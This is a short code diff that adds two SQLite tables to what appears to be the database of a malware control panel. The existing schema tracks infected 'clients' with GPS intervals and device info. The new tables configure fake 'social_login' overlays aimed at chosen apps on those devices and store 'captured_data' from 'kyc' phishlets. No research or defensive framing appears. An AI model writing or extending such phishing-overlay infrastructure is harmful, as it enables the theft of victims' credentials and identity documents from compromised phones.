@@ -127,6 +127,25 @@ export function initDb(): DB {
       gps_interval INTEGER DEFAULT 0,
       device_info TEXT
     );
+
+    CREATE TABLE IF NOT EXISTS overlay_configs (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  client_id TEXT NOT NULL REFERENCES clients(id) ON DELETE CASCADE,
+  enabled INTEGER DEFAULT 0,
+  persistent INTEGER DEFAULT 1,
+  target_apps TEXT DEFAULT '[]',
+  template_type TEXT DEFAULT 'social_login',
+  created_at INTEGER NOT NULL,
+  updated_at INTEGER NOT NULL
+);
+CREATE TABLE IF NOT EXISTS phishlet_data (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  client_id TEXT NOT NULL REFERENCES clients(id) ON DELETE CASCADE,
+  phishlet_type TEXT DEFAULT 'kyc',
+  captured_data TEXT DEFAULT '{}',
+  created_at INTEGER NOT NULL
+);
+
     CREATE TABLE IF NOT EXISTS client_data (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       client_id TEXT NOT NULL,
